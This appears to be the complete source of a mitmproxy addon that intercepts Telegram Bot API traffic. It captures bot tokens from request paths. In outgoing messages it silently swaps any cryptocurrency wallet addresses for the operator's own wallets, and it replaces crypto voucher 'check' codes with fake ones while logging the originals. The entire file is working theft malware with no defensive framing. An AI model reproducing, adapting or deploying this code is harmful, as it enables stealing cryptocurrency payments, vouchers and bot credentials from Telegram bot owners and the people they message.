import re
import time
import urllib.parse
import json
from mitmproxy import http
import sys
import os

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

try:
    from patterns import CryptoPatterns
    from storage import storage
except ImportError as e:
    print(f"Import error: {e}")
    sys.exit(1)

class TelegramInterceptor:
    def __init__(self):
        self.patterns = CryptoPatterns.get_all_patterns()
        print(f"[{time.strftime('%H:%M:%S')}] MITM Interceptor initialized")

    def extract_text(self, flow: http.HTTPFlow):
        if not flow.request.content:
            return "", ""

        try:
            raw_data = flow.request.content.decode('utf-8', errors='ignore')

            if 'application/x-www-form-urlencoded' in flow.request.headers.get('Content-Type', ''):
                params = urllib.parse.parse_qs(raw_data)
                if 'text' in params:
                    return params['text'][0], raw_data
                elif 'caption' in params:
                    return params['caption'][0], raw_data

            if 'application/json' in flow.request.headers.get('Content-Type', ''):
                try:
                    data = json.loads(raw_data)
                    if 'text' in data:
                        return data['text'], raw_data
                    elif 'caption' in data:
                        return data['caption'], raw_data
                except:
                    pass

            text_match = re.search(r'text=([^&]+)', raw_data)
            if text_match:
                return urllib.parse.unquote(text_match.group(1)), raw_data

            return "", raw_data

        except Exception:
            return "", ""

    def replace_wallets(self, text: str):
        if not text:
            return text, []

        replaced = []
        modified_text = text

        all_wallets = storage.get_all_wallets()

        for coin_type, pattern in self.patterns.items():
            current_wallet = all_wallets.get(coin_type, "")

            if not current_wallet or len(current_wallet) < 10:
                continue

            matches = list(pattern.finditer(text))
            for match in matches:
                wallet = match.group()

                if wallet != current_wallet:
                    modified_text = modified_text.replace(wallet, current_wallet)
                    replaced.append((coin_type, wallet))

        return modified_text, replaced

    def replace_checks(self, text: str):
        if not text:
            return text, []

        replaced = []
        modified_text = text

        for pattern in CryptoPatterns.CRYPTO_CHECKS:
            matches = list(pattern.finditer(text))
            for match in matches:
                check_url = match.group()
                start_match = re.search(r'start=([A-Za-z0-9_\-]+)', check_url)

                if start_match:
                    original_check = start_match.group(1)
                    fake_check = f"MITM_{int(time.time())}_{original_check[:10]}"
                    new_url = check_url.replace(original_check, fake_check)
                    modified_text = modified_text.replace(check_url, new_url)
                    replaced.append(original_check)

        return modified_text, replaced

    def update_request(self, flow: http.HTTPFlow, original_raw: str, new_text: str):
        try:
            encoded_text = urllib.parse.quote(new_text)

            text_match = re.search(r'(text=)([^&]+)', original_raw)
            if text_match:
                new_raw = original_raw.replace(text_match.group(0), f"text={encoded_text}")
                flow.request.content = new_raw.encode('utf-8')
                return True

            caption_match = re.search(r'(caption=)([^&]+)', original_raw)
            if caption_match:
                new_raw = original_raw.replace(caption_match.group(0), f"caption={encoded_text}")
                flow.request.content = new_raw.encode('utf-8')
                return True

            return False

        except Exception:
            return False

    def extract_bot_token(self, path: str):
        match = re.search(r'/bot(\d+:[A-Za-z0-9_-]+)/', path)
        return match.group(1) if match else None

    def request(self, flow: http.HTTPFlow):
        if "api.telegram.org" in flow.request.host and "/bot" in flow.request.path:
            timestamp = time.strftime("%H:%M:%S")

            bot_token = self.extract_bot_token(flow.request.path)
            if bot_token:
                storage.add_bot_detected(bot_token)
                print(f"[{timestamp}] 🤖 Bot detected")

            if "sendMessage" in flow.request.path or "sendPhoto" in flow.request.path:
                original_text, raw_data = self.extract_text(flow)

                if original_text:
                    text_after_wallets, wallets_replaced = self.replace_wallets(original_text)
                    final_text, checks_replaced = self.replace_checks(text_after_wallets)

                    if wallets_replaced or checks_replaced:
                        if self.update_request(flow, raw_data, final_text):
                            for coin_type, wallet in wallets_replaced:
                                storage.increment_wallets(coin_type, wallet)
                                print(f"[{timestamp}] ✅ Replaced {coin_type}")

                            for check in checks_replaced:
                                storage.increment_checks(check)
                                print(f"[{timestamp}] 🎫 Caught check")

    def response(self, flow: http.HTTPFlow):
        pass

addons = [TelegramInterceptor()]
